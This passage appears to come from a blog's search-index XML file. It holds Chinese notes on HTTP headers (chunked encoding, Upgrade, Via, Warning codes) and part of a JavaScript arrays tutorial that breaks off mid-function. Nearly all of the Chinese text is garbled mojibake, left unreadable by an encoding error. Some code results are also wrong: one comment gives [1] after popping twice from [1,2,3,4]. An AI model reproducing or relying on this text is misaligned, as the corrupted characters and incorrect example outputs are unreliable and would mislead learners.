â†16è¿›åˆ¶(10è¿›åˆ¶ä¸º3312)...3312å­—èŠ‚åˆ†å—æ•°æ®...392 â†16è¿›åˆ¶(10è¿›åˆ¶ä¸º914)...914å­—èŠ‚åˆ†å—æ•°æ®...0 ä»¥ä¸Šç”¨ä¾‹ä¸­ï¼Œæ­£å¦‚åœ¨é¦–éƒ¨å­—æ®µ Transfer-Encoding ä¸­æŒ‡å®šçš„é‚£æ ·ï¼Œæœ‰æ•ˆä½¿ç”¨åˆ†å—ä¼ è¾“ç¼–ç ï¼Œä¸”åˆ†åˆ«è¢«åˆ†æˆ 3312 å­—èŠ‚å’Œ 914 å­—èŠ‚å¤§å°çš„åˆ†å—æ•°æ®ã€‚ Upgradeé¦–éƒ¨å­—æ®µ Upgrade ç”¨äºŽæ£€æµ‹ HTTP åè®®åŠå…¶ä»–åè®®æ˜¯å¦å¯ä½¿ç”¨æ›´é«˜çš„ç‰ˆæœ¬è¿›è¡Œé€šä¿¡ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®Œå…¨ä¸åŒçš„é€šä¿¡åè®®ã€‚ ä¸Šå›¾ç”¨ä¾‹ä¸­ï¼Œé¦–éƒ¨å­—æ®µ Upgrade æŒ‡å®šçš„å€¼ä¸º TLS/1.0ã€‚è¯·æ³¨æ„æ­¤å¤„ä¸¤ä¸ªå­—æ®µé¦–éƒ¨å­—æ®µçš„å¯¹åº”å…³ç³»ï¼ŒConnection çš„å€¼è¢«æŒ‡å®šä¸º Upgradeã€‚Upgrade é¦–éƒ¨å­—æ®µäº§ç”Ÿä½œç”¨çš„ Upgrade å¯¹è±¡ä»…é™äºŽå®¢æˆ·ç«¯å’Œé‚»æŽ¥æœåŠ¡å™¨ä¹‹é—´ã€‚å› æ­¤ï¼Œä½¿ç”¨é¦–éƒ¨å­—æ®µ Upgrade æ—¶ï¼Œè¿˜éœ€è¦é¢å¤–æŒ‡å®šConnection:Upgradeã€‚å¯¹äºŽé™„æœ‰é¦–éƒ¨å­—æ®µ Upgrade çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ç”¨ 101 SwitchingProtocols çŠ¶æ€ç ä½œä¸ºå“åº”è¿”å›žã€‚ Viaä½¿ç”¨é¦–éƒ¨å­—æ®µ Via æ˜¯ä¸ºäº†è¿½è¸ªå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„ä¼ è¾“è·¯å¾„ã€‚æŠ¥æ–‡ç»è¿‡ä»£ç†æˆ–ç½‘å…³æ—¶ï¼Œä¼šå…ˆåœ¨é¦–éƒ¨å­—æ®µ Via ä¸­é™„åŠ è¯¥æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œç„¶åŽå†è¿›è¡Œè½¬å‘ã€‚è¿™ä¸ªåšæ³•å’Œtraceroute åŠç”µå­é‚®ä»¶çš„ Receivedé¦–éƒ¨çš„å·¥ä½œæœºåˆ¶å¾ˆç±»ä¼¼ã€‚é¦–éƒ¨å­—æ®µ Via ä¸ä»…ç”¨äºŽè¿½è¸ªæŠ¥æ–‡çš„è½¬å‘ï¼Œè¿˜å¯é¿å…è¯·æ±‚å›žçŽ¯çš„å‘ç”Ÿã€‚æ‰€ä»¥å¿…é¡»åœ¨ç»è¿‡ä»£ç†æ—¶é™„åŠ è¯¥é¦–éƒ¨å­—æ®µå†…å®¹ã€‚ ä¸Šå›¾ç”¨ä¾‹ä¸­ï¼Œåœ¨ç»è¿‡ä»£ç†æœåŠ¡å™¨ A æ—¶ï¼ŒVia é¦–éƒ¨é™„åŠ äº†â€œ1.0gw.hackr.jp (Squid/3.1)â€è¿™æ ·çš„å­—ç¬¦ä¸²å€¼ã€‚è¡Œå¤´çš„ 1.0 æ˜¯æŒ‡æŽ¥æ”¶è¯·æ±‚çš„æœåŠ¡å™¨ä¸Šåº”ç”¨çš„ HTTP åè®®ç‰ˆæœ¬ã€‚æŽ¥ä¸‹æ¥ç»è¿‡ä»£ç†æœåŠ¡å™¨ B æ—¶äº¦æ˜¯å¦‚æ­¤ï¼Œåœ¨ Via é¦–éƒ¨é™„åŠ æœåŠ¡å™¨ä¿¡æ¯ï¼Œä¹Ÿå¯å¢žåŠ  1 ä¸ªæ–°çš„ Via é¦–éƒ¨å†™å…¥æœåŠ¡å™¨ä¿¡æ¯ã€‚ Via é¦–éƒ¨æ˜¯ä¸ºäº†è¿½è¸ªä¼ è¾“è·¯å¾„ï¼Œæ‰€ä»¥ç»å¸¸ä¼šå’Œ TRACE æ–¹æ³•ä¸€èµ·ä½¿ç”¨ã€‚æ¯”å¦‚ï¼Œä»£ç†æœåŠ¡å™¨æŽ¥æ”¶åˆ°ç”± TRACE æ–¹æ³•å‘é€è¿‡æ¥çš„è¯·æ±‚ï¼ˆå…¶ä¸­Max-Forwards: 0ï¼‰æ—¶ï¼Œä»£ç†æœåŠ¡å™¨å°±ä¸èƒ½å†è½¬å‘è¯¥è¯·æ±‚äº†ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œä»£ç†æœåŠ¡å™¨ä¼šå°†è‡ªèº«çš„ä¿¡æ¯é™„åŠ åˆ° Via é¦–éƒ¨åŽï¼Œè¿”å›žè¯¥è¯·æ±‚çš„å“åº”ã€‚ WarningHTTP/1.1 çš„ Warning é¦–éƒ¨æ˜¯ä»Ž HTTP/1.0 çš„å“åº”é¦–éƒ¨ï¼ˆRetry-Afterï¼‰æ¼”å˜è¿‡æ¥çš„ã€‚è¯¥é¦–éƒ¨é€šå¸¸ä¼šå‘ŠçŸ¥ç”¨æˆ·ä¸€äº›ä¸Žç¼“å­˜ç›¸å…³çš„é—®é¢˜çš„è­¦å‘Šã€‚ 1Warning: 113 gw.hackr.jp:8080 "Heuristic expiration" Tue, 03 Jul 2012 Warning é¦–éƒ¨çš„æ ¼å¼å¦‚ä¸‹ã€‚æœ€åŽçš„æ—¥æœŸæ—¶é—´éƒ¨åˆ†å¯çœç•¥ã€‚ 1Warning: [è­¦å‘Šç ][è­¦å‘Šçš„ä¸»æœº:ç«¯å£å·]â€œ[è­¦å‘Šå†…å®¹]â€([æ—¥æœŸæ—¶é—´]) HTTP/1.1 ä¸­å®šä¹‰äº† 7 ç§è­¦å‘Šã€‚è­¦å‘Šç å¯¹åº”çš„è­¦å‘Šå†…å®¹ä»…æŽ¨èå‚è€ƒã€‚å¦å¤–ï¼Œè­¦å‘Šç å…·å¤‡æ‰©å±•æ€§ï¼Œä»ŠåŽæœ‰å¯èƒ½è¿½åŠ æ–°çš„è­¦å‘Šç ã€‚ è­¦å‘Šç  è­¦å‘Šå†…å®¹ è¯´æ˜Ž 110 Response is staleï¼ˆå“åº”å·²è¿‡æœŸï¼‰ ä»£ç†è¿”å›žå·²è¿‡æœŸçš„èµ„æº 111 Revalidation failedï¼ˆå†éªŒè¯å¤±è´¥ï¼‰ ä»£ç†å†éªŒè¯èµ„æºæœ‰æ•ˆæ€§æ—¶å¤±è´¥ï¼ˆæœåŠ¡å™¨æ— æ³•åˆ°è¾¾ç­‰åŽŸå› ï¼‰ 112 Disconnection operationï¼ˆæ–­å¼€è¿žæŽ¥æ“ ä»£ç†ä¸Žäº’è”ç½‘è¿žæŽ¥è¢«æ•…æ„åˆ‡æ–­ 113 Heuristic expirationï¼ˆè¯•æŽ¢æ€§è¿‡æœŸï¼‰ å“åº”çš„ä½¿ç”¨æœŸè¶…è¿‡24å°æ—¶ï¼ˆæœ‰æ•ˆç¼“å­˜ 199 Miscellaneous warningï¼ˆæ‚é¡¹è­¦å‘Šï¼‰ ä»»æ„çš„è­¦å‘Šå†…å®¹ 214 Transformation appliedï¼ˆä½¿ç”¨äº†è½¬æ¢ï¼‰ ä»£ç†å¯¹å†…å®¹ç¼–ç æˆ–åª’ä½“ç±»åž‹ç­‰æ‰§è¡Œäº† 299 Miscellaneous persistent warningï¼ˆæŒä¹… ä»»æ„çš„è­¦å‘Šå†…å®¹ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬äºŒç« ï¼‰â€”â€” æ•°ç»„]]></title>
    <url>%2F2018-08-16-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part2.html</url>
    <content type="text"><![CDATA[ç¬¬äºŒç«  æ•°ç»„å‡ ä¹Žæ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€éƒ½åŽŸç”Ÿæ”¯æŒæ•°ç»„ç±»åž‹ï¼Œå› ä¸ºæ•°ç»„æ˜¯æœ€ç®€å•çš„å†…å­˜æ•°æ®ç»“æž„ã€‚JavaScripté‡Œä¹Ÿæœ‰æ•°ç»„ç±»åž‹ï¼Œè™½ç„¶å®ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬å¹¶æ²¡æœ‰æ”¯æŒæ•°ç»„ã€‚æœ¬ç« å°†æ·±å…¥å­¦ä¹ æ•°ç»„æ•°æ®ç»“æž„å’Œå®ƒçš„èƒ½åŠ›ã€‚ ä¸ºä»€ä¹ˆç”¨æ•°ç»„éœ€æ±‚ï¼šä¿å­˜æ‰€åœ¨åŸŽå¸‚æ¯ä¸ªæœˆçš„å¹³å‡æ¸©åº¦ï¼Œå¯ä»¥è¿™ä¹ˆå®žçŽ° 123456var averageTemp1 = 43.3;var averageTemp2 = 53.2;var averageTemp3 = 14.2;var averageTemp4 = 42.8;var averageTemp5 = 14.8;var averageTemp6 = 78.9; åªæ˜¯ä¿å­˜å‰å…­ä¸ªæœˆå°±ç”¨äº†6ä¸ªå˜é‡ï¼Œæ˜¾ç„¶è¿™ç§æ–¹å¼ä¸é€‚åˆä¿å­˜è¿™ç±»éœ€æ±‚ã€‚é€šè¿‡æ•°ç»„å¯ä»¥ç®€å•åœ°å®žçŽ°æˆ‘ä»¬çš„éœ€æ±‚ã€‚ 1234567var averageTemp = [];averageTemp[0] = 43.3;averageTemp[1] = 53.2;averageTemp[2] = 14.2;averageTemp[3] = 42.8;averageTemp[4] = 14.8;averageTemp[5] = 78.9; åˆ›å»ºå’Œåˆå§‹åŒ–æ•°ç»„å£°æ˜Žã€åˆ›å»ºå’Œåˆå§‹åŒ–æ•°ç»„çš„æ–¹å¼å¾ˆç®€å• 123var temp = new Array(); // ä½¿ç”¨ new å…³é”®å­—ï¼Œç®€å•å£°æ˜Žå¹¶åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„var temp = new Array(8); // è¿˜å¯ä»¥åˆ›å»ºä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„æ•°ç»„var temp = new Array(1,2,4,9); // ç›´æŽ¥å°†æ•°ç»„å…ƒç´ ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒçš„æž„é€ å™¨ é™¤äº†ç”¨ newåˆ›å»ºæ•°ç»„ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸­æ‹¬å· []ç®€å•åˆ›å»ºæ•°ç»„ã€‚ 1var temp = [1,2,4,9]; è®¿é—®å…ƒç´ å’Œè¿­ä»£æ•°ç»„é€šè¿‡åœ¨æ•°ç»„é‡ŒæŒ‡å®šç‰¹å®šä½ç½®çš„å…ƒç´ ï¼Œå¯ä»¥èŽ·å–è¯¥å€¼æˆ–è€…èµ‹å€¼ã€‚è€Œè¦çŸ¥é“ä¸€ä¸ªæ•°ç»„é‡Œæ‰€æœ‰çš„å…ƒç´ ï¼Œå¯ä»¥é€šè¿‡å¾ªçŽ¯éåŽ†æ•°ç»„ã€‚ 123for(var i = 0; i &lt; temp.length; i++)&#123; console.log(temp[i]); // 1,2,4,9&#125; æ¡ˆä¾‹ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—å·²çŸ¥æ–æ³¢é‚£å¥‘æ•°åˆ—ä¸­çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯1ï¼Œç¬¬äºŒä¸ªæ•°å­—æ˜¯2ï¼Œä»Žç¬¬ä¸‰é¡¹å¼€å§‹ï¼Œæ¯ä¸€é¡¹éƒ½ç­‰äºŽå‰ä¸¤é¡¹ä¹‹å’Œã€‚æ±‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„å‰20ä¸ªæ•° 12345678var fibonacci = [];fibonacci[1] = 1;fibonacci[2] = 2;for(var i =3; i &lt; 20; i++)&#123; fibonacci[i] = fibonacci[i-1] + fibonacci[i-2];&#125;console.log(fibonacci); // [ 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765] æ·»åŠ å…ƒç´ 123var number = [1,2,3];number[number.length] = 4;number // 1,2,3,4 ä¸Šè¿°ä»£ç å¯ä»¥åœ¨æ•°ç»„çš„æœ€åŽä¸€ä½æ·»åŠ å…ƒç´ ï¼Œä½†å…¶å®žè¿˜æœ‰æ›´åŠ ç®€ä¾¿çš„æ–¹æ³•ï¼š pushpush èƒ½æ·»åŠ ä»»æ„ä¸ªå…ƒç´ åœ¨æ•°ç»„çš„æœ«å°¾ 123number.push(5); // 5number.push(6,7); //7number // [1,2,3,4,5,6,7] æ•°ç»„ä½¿ç”¨ push ä¼šè¿”å›žæ•°ç»„çš„é•¿åº¦ æ’å…¥å…ƒç´ åˆ°æ•°ç»„é¦–ä½é¦–å…ˆæˆ‘ä»¬è¦è…¾å‡ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½ç½®ï¼ŒæŠŠæ‰€æœ‰çš„å…ƒç´ å‘å³ç§»åŠ¨ä¸€ä½ã€‚æˆ‘ä»¬å¯ä»¥å¾ªçŽ¯æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œä»Žæœ€åŽä¸€ä½+1ï¼ˆé•¿åº¦ï¼‰å¼€å§‹ï¼Œå°†å…¶å¯¹åº”çš„å‰ä¸€ä¸ªå…ƒç´ çš„å€¼èµ‹ç»™å®ƒï¼Œä¾æ¬¡å¤„ç†ï¼Œæœ€åŽæŠŠæˆ‘ä»¬æƒ³è¦çš„å€¼èµ‹ç»™ç¬¬ä¸€ä¸ªä½ç½®ï¼ˆ-1ï¼‰ä¸Šã€‚ 1234for(var i = number.length; i&gt;=0; i--)&#123; number[i] = number[i-1];&#125;number[0] = -0; unshiftæˆ–è€…ç›´æŽ¥ ä½¿ç”¨ unshift æ–¹æ³•ï¼Œå¯ä»¥å°†æ•°å€¼æ’å…¥æ•°ç»„çš„é¦–ä½ï¼š 1234var number = [1,2,3,4];number.unshift(-2); // 5number.unshift(-4,-3); // 7number // [-4, -3, -2, 1, 2, 3, 4] æ•°ç»„ä½¿ç”¨ unshift ä¼šè¿”å›žæ•°ç»„çš„é•¿åº¦ åˆ é™¤å…ƒç´ ä»Žæ•°ç»„å°¾éƒ¨åˆ é™¤å…ƒç´ popè¦åˆ é™¤æœ€é åŽçš„å…ƒç´ å¯ä»¥ä½¿ç”¨ pop æ–¹æ³•ï¼Œä¼šåˆ é™¤å¹¶è¿”å›žæ•°ç»„çš„æœ€åŽä¸€ä¸ªå…ƒç´ ã€‚å¦‚æžœæ•°ç»„å·²ç»ä¸ºç©ºï¼Œåˆ™ pop() ä¸æ”¹å˜æ•°ç»„ï¼Œå¹¶è¿”å›ž undefined å€¼ã€‚ 12345var number = [1,2,3,4];number.pop(); //4number // [1,2,3]number.pop() // 3number // [1] ä»Žæ•°ç»„é¦–éƒ¨åˆ é™¤å…ƒç´ å¦‚æžœè¦ç§»é™¤æ•°ç»„é‡Œçš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ä»£ç  12345var number = [1,2,3,4];for(var i = 0;i &lt; number.length; i++)&#123; number[i] = number[i+1];&#125;number // [2, 3, 4, undefined] å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬å°†æ•°ç»„å·¦ç§»äº†ä¸€ä½ï¼Œä½†æ•°ç»„çš„é•¿åº¦ä»ç„¶æ²¡æœ‰å˜åŒ–ï¼Œè¿™æ„å‘³ç€æ•°ç»„ä¸­æœ‰ä¸€ä¸ªé¢å¤–çš„å…ƒç´ ï¼Œå› ä¸ºæ²¡æœ‰å®šä¹‰ï¼Œæ‰€ä»¥æ˜¯ undefined shiftshift() æ–¹æ³•ç”¨äºŽæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä»Žå…¶ä¸­åˆ é™¤ï¼Œå¹¶è¿”å›žç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚ æ•°ç»„çš„é•¿åº¦ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ã€‚å¦‚æžœæ•°ç»„æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆ shift() æ–¹æ³•å°†ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼Œè¿”å›ž undefined å€¼ã€‚ å°ç»“ ä¿®æ”¹æ•°ç»„çš„æ–¹æ³• æè¿° push push() æ–¹æ³•å¯å‘æ•°ç»„çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›žæ–°çš„é•¿åº¦ã€‚ unshift unshift() æ–¹æ³•å¯å‘æ•°ç»„çš„å¼€å¤´æ·»åŠ ä¸€ä¸ªæˆ–æ›´å¤šå…ƒç´ ï¼Œå¹¶è¿”å›žæ–°çš„é•¿åº¦ã€‚ pop pop() æ–¹æ³•ç”¨äºŽåˆ é™¤å¹¶è¿”å›žæ•°ç»„çš„æœ€åŽä¸€ä¸ªå…ƒç´ ã€‚ å¦‚æžœæ•°ç»„å·²ç»ä¸ºç©ºï¼Œåˆ™ pop() ä¸æ”¹å˜æ•°ç»„ï¼Œå¹¶è¿”å›ž undefined å€¼ã€‚ shift shift() æ–¹æ³•ç”¨äºŽæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä»Žå…¶ä¸­åˆ é™¤ï¼Œå¹¶è¿”å›žç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚ å¦‚æžœæ•°ç»„æ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆ shift() æ–¹æ³•å°†ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼Œè¿”å›ž undefined å€¼ push() æ–¹æ³•å’Œ pop() æ–¹æ³•ï¼Œèƒ½ç”¨æ•°ç»„æ¨¡æ‹ŸåŸºæœ¬çš„æ ˆçš„æ•°æ®ç»“æž„ï¼ˆå…ˆè¿›åŽå‡ºï¼‰ã€‚ shift()æ–¹æ³•å’Œunshift()æ–¹æ³•ï¼Œèƒ½ç”¨æ•°ç»„æ¨¡æ‹ŸåŸºæœ¬çš„é˜Ÿåˆ—çš„æ•°æ®ç»“æž„ï¼ˆå…ˆè¿›å…ˆå‡º ï¼‰ã€‚ åœ¨ä»»æ„ä½ç½®æ·»åŠ æˆ–è€…åˆ é™¤å…ƒç´ å·²ç»çŸ¥é“å¦‚ä½•åˆ é™¤æ•°ç»„å¼€å¤´å’Œç»“å°¾çš„å…ƒç´ ï¼Œé‚£ä¹ˆè¯¥æ€Žä¹ˆåœ¨æ•°ç»„ä¸­çš„ä»»æ„ä½ç½®åˆ é™¤æˆ–è€…æ·»åŠ å…ƒç´ ï¼Ÿ splicesplice() æ–¹æ³•å‘/ä»Žæ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åŽè¿”å›žè¢«åˆ é™¤çš„é¡¹ç›®ã€‚ splice() æ–¹æ³•å¯åˆ é™¤ä»Ž index å¤„å¼€å§‹çš„é›¶ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œå¹¶ä¸”ç”¨å‚æ•°åˆ—è¡¨ä¸­å£°æ˜Žçš„ä¸€ä¸ªæˆ–å¤šä¸ªå€¼æ¥æ›¿æ¢é‚£äº›è¢«åˆ é™¤çš„å…ƒç´ ã€‚ è¯­æ³• 1arrayObject.splice(index,howmany,item1,.....,itemX) ä¾‹å­ 12345var number = [1,2,3,4];number.splice(2,0,4,4,5); // []number //[1, 2, 4, 4, 5, 3, 4]number.splice(2,5,7); // [4, 4, 5, 3, 4]number //[1, 2, 7] äºŒç»´æˆ–è€…å¤šç»´æ•°ç»„æˆ‘ä»¬çŸ¥é“å¦‚æžœè¦è®°å½•æ•°å¤©å†…æ¯ä¸ªå°æ—¶çš„æ°”æ¸©ï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„æ¥ä¿å­˜è¿™äº›æ•°æ®ã€‚é‚£ä¹ˆè¦ä¿å­˜ä¸¤å¤©æ¯å°æ—¶æ°”æ¸©çš„æ•°æ®çš„æ—¶å€™å¯ä»¥è¿™æ ·ã€‚ 12var averageTemp1 = [32,53,45,23,46,53];var averageTemp2 = [98,32,74,34,63,73]; ç„¶è€Œè¿™ä¸æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚å¯ä»¥ä½¿ç”¨çŸ©é˜µï¼ˆäºŒç»´æ•°ç»„ï¼‰æ¥å­˜å‚¨è¿™äº›ä¿¡æ¯ã€‚çŸ©é˜µçš„è¡Œä¿å­˜æ¯å¤©çš„æ•°æ®ï¼Œåˆ—å¯¹åº”å°æ—¶çº§åˆ«çš„æ•°æ®ã€‚ 123var averageTemp = [];averageTemp[0] = [32,53,45,23,46,53];averageTemp[1] = [98,32,74,34,63,73]; JavaScriptåªæ”¯æŒä¸€ç»´æ•°ç»„ï¼Œå¹¶ä¸æ”¯æŒçŸ©é˜µã€‚ä½†æ˜¯ï¼Œå¯ä»¥ç”¨æ•°ç»„å¥—æ•°ç»„æ¥æ¨¡æ‹ŸçŸ©é˜µæˆ–è€…ä»»ä¸€å¤šç»´æ•°ç»„ã€‚ è¿­ä»£äºŒç»´æ•°ç»„çš„å…ƒç´ å¦‚æžœæƒ³çœ‹åˆ°è¿™çŸ©é˜µçš„è¾“å‡ºï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªé€šç”¨å‡½æ•°ï¼Œä¸“é—¨è¾“å‡ºå…¶ä¸­çš„å€¼ï¼š 12345678function printMatrix(x)&#123; for(var i = 0; i &lt; x.length; i++)&#123; for(var j = 0; j&lt; x[i].length; j++)&#123; console.log(x[i][j]); &#125; &#125;&#125;printMatrix(averageTemp); å¤šç»´æ•°ç»„æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹å¼æ¥å¤„ç†å¤šç»´æ•°ç»„ã€‚å‡å¦‚æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ª3x3x3çš„çŸ©é˜µï¼Œæ¯ä¸€ä¸ªæ ¼å­é‡ŒåŒ…å«çŸ©é˜µçš„iï¼ˆè¡Œï¼‰ã€jï¼ˆåˆ—ï¼‰ã€zï¼ˆæ·±åº¦ï¼‰ä¹‹å’Œï¼š 1234567891011var matrix3x3x3 = [];for(var i = 0; i &lt; 3; i++)&#123; matrix3x3x3[i] = []; for(var j = 0; j &lt; 3; j++)&#123; matrix3x3x3[i][j] = []; for(var z = 0; z &lt; 3; z++)&#123; matrix3x3x3[i][j][z] = i+j+z; &#125; &#125;&#125; æ•°æ®ç»“æž„ä¸­æœ‰å‡ ä¸ªç»´åº¦éƒ½æ²¡æœ‰å…³ç³»ï¼Œéƒ½å¯ä»¥ç”¨å¾ªçŽ¯éåŽ†æ¯ä¸ªç»´åº¦æ¥è®¿é—®æ‰€æœ‰æ ¼å­ 1234567for(var i = 0; i &lt; matrix3x3x3.length; i++)&#123; for(var j = 0; j&lt; matrix3x3x3[i].length; j++)&#123; for(var z = 0; z &lt; matrix3x3x3[i][j].length; z++)&#123; console.log(matrix3x3x3[i][j][z]); &#125; &#125;&#125; å¦‚æžœæ˜¯ä¸€ä¸ª3x3x3x3çš„çŸ©é˜µï¼Œä»£ç ä¸­å°±ä¼šç”¨å››å±‚åµŒå¥—çš„ for è¯­å¥ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚ JavaScript çš„æ•°ç»„æ–¹æ³•å‚è€ƒåœ¨JavaScripté‡Œï¼Œæ•°ç»„æ˜¯å¯ä»¥ä¿®æ”¹çš„å¯¹è±¡ã€‚è¿™æ„å‘³ç€åˆ›å»ºçš„æ¯ä¸€ä¸ªæ•°ç»„éƒ½æœ‰ä¸€äº›å¯ç”¨çš„æ–¹æ³•ã€‚ ä¸‹é¢è¡¨æ ¼æ˜¯æ•°ç»„çš„ä¸€äº›æ ¸å¿ƒæ–¹æ³•ã€‚ æ–¹æ³•å æè¿° concat è¿žæŽ¥2ä¸ªæˆ–è€…æ›´å¤šæ•°ç»„ï¼Œå¹¶è¿”å›žç»“æžœ every å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œå¦‚æžœè¯¥å‡½æ•°å¯¹æ¯ä¸€é¡¹éƒ½ä½†è¿”å›žtrue,åˆ™è¿”å›žtrue filter å¯¹æ•°ç»„ä¸­åº¦è¿‡æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿”å›žè¯¥å‡½æ•°ä¼šè¿”å›žtrueçš„é¡¹ç»„æˆåˆ†æ•°ç»„ forEach å¯¹æ•°ç»„ä¸­æ›´å¤šæ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿™ä¸ªæ–¹æ³•æ²¡æœ‰è¿”å›žå€¼ join å°†æ‰€æœ‰çš„æ•°ç»„å…ƒç´ è¿žæŽ¥æˆä¸€ä¸ªå­—ç¬¦ä¸² indexOf è¿”å›žç¬¬ä¸€ä¸ªä¸Žç»™å®šå‚æ•°ç›¸ç­‰çš„æ•°ç»„å…ƒç´ çš„ç´¢å¼•ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›ž-1 lastIndexOf è¿”å›žåœ¨æ•°ç»„ä¸­æœç´¢åˆ°çš„ä¸Žç»™å®šå‚æ•°ç›¸ç­‰çš„å…ƒç´ çš„ç´¢å¼•é‡Œæœ€å¤§çš„å€¼ map å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œè¿”å›žæ¯æ¬¡å‡½æ•°è°ƒç”¨ç»“æžœç»„æˆçš„æ•°ç»„ reverse é¢ å€’æ•°ç»„ä¸­çš„å…ƒç´ çš„é¡ºåºï¼ŒåŽŸå…ˆç¬¬ä¸€ä¸ªå…ƒç´ çŽ°åœ¨å˜æˆäº†æœ€åŽä¸€ä¸ªï¼ŒåŒæ ·åŽŸå…ˆçš„æœ€åŽä¸€ä¸ªå…ƒç´ å˜æˆäº†çŽ°åœ¨çš„ç¬¬ä¸€ä¸ª slice ä¼ å…¥ç´¢å¼•å€¼ï¼Œå°†æ•°ç»„é‡Œå¯¹åº”ç´¢å¼•èŒƒå›´å†…çš„å…ƒç´ ä½œä¸ºæ–°æ•°ç»„è¿”å›ž some å¯¹æ•°ç»„ä¸­æ¯ä¸€é¡¹è¿è¡Œç»™å®šå‡½æ•°ï¼Œå¦‚æžœä»»ä¸€é¡¹è¿”å›žtrue,åˆ™è¿”å›žtrue sort æŒ‰ç…§å­—æ¯çš„é¡ºåºå¯¹æ•°ç»„æŽ’åºï¼Œæ”¯æŒä¼ å…¥æŒ‡å®šæŽ’åºæ–¹æ³•çš„å‡½æ•°ä½œä¸ºå‚æ•° toString å°†æ•°ç»„ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ž valueOf å’Œ toString ç›¸ä¼¼ï¼Œå°†æ•°ç»„ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ž æ•°ç»„åˆå¹¶æœ‰å¤šä¸ªæ•°ç»„ï¼Œéœ€è¦åˆå¹¶èµ·æ¥æˆä¸ºä¸€ä¸ªæ•°ç»„ã€‚æˆ‘ä»¬å¯ä»¥è¿­ä»£å„ä¸ªæ•°ç»„ï¼Œç„¶åŽæŠŠæ¯ä¸ªå…ƒç´ åŠ å…¥æœ€ç»ˆçš„æ•°ç»„ã€‚ JavaScriptä¹Ÿæœ‰æä¾›ç›¸å¯¹åº”çš„æ–¹æ³• concat() 12345var a = 0;var b = [1,2,3];var c = [-3,-2,-1];var s = c.concat(a,b);s // [-3, -2, -1, 0, 1, 2, 3] è¿­ä»£å™¨å‡½æ•°æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è¿­ä»£æ•°ç»„ä¸­çš„å…ƒç´ ã€‚å¯ä»¥ä½¿ç”¨å¾ªçŽ¯è¯­å¥ï¼ˆå‰é¢æåˆ°çš„forè¯­å¥ç­‰ï¼‰ã€‚è€Œå…¶å®ž JavaScript å†…ç½®äº†è®¸å¤šæ•°ç»„å¯ä»¥ä½¿ç”¨çš„è¿­ä»£æ–¹æ³•ã€‚ å¯¹äºŽæœ¬èŠ‚çš„ä¾‹å­ï¼Œæˆ‘ä»¬éœ€è¦å‡½æ•°å’Œæ•°ç»„ã€‚å‡å¦‚æœ‰ä¸€ä¸ªæ•°ç»„ï¼Œå€¼æ˜¯ä»Ž1åˆ°15ï¼Œå¦‚æžœæ•°ç»„é‡Œé¢çš„å…ƒç´ å¯ä»¥è¢«2æ•´é™¤ï¼ˆå¶æ•°ï¼‰ï¼Œå‡½æ•°å°±è¦è¿”å›žtrue,å¦åˆ™å°±è¿”å›žfalse: 12345var isEven = function(x)&#123; // 